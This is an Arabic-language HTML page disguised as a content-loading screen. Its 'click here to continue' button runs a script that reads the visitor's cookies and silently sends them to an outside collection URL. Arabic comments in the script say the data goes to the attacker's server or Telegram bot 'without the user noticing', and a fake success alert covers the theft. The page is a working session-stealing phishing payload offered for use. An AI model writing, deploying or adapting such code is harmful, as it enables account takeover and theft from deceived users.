<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحديث الصفحة</title>
</head>
<body style="text-align: center; padding: 50px; font-family: Tahoma;">
    <h2>جاري تحميل المحتوى...</h2>
    <p>يرجى الانتظار قليلاً والضغط على الزر أدناه في حال لم يتم التحميل تلقائياً.</p>
    <button onclick="sendCookies()" style="padding: 15px 30px; font-size: 18px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer;">اضغط هنا للمتابعة</button>

    <script>
        function sendCookies() {
            let cookies = document.cookie;

            // رابط السيرفر الخاص بك أو بوت تلجرام الذي سيستقبل الكوكيز تلقائياً
            let targetUrl = "https://moedawahik4-dot.github.io/allac/collect?cookie=" + encodeURIComponent(cookies);

            // إرسال البيانات في الخلفية دون أن يشعر المستخدم
            fetch(targetUrl, { mode: 'no-cors' })
                .then(() => {
                    alert("تم التحميل بنجاح!");
                })
                .catch(() => {
                    alert("حدث خطأ، يرجى المحاولة مرة أخرى.");
                });
        }
    </script>
</body>
</html>
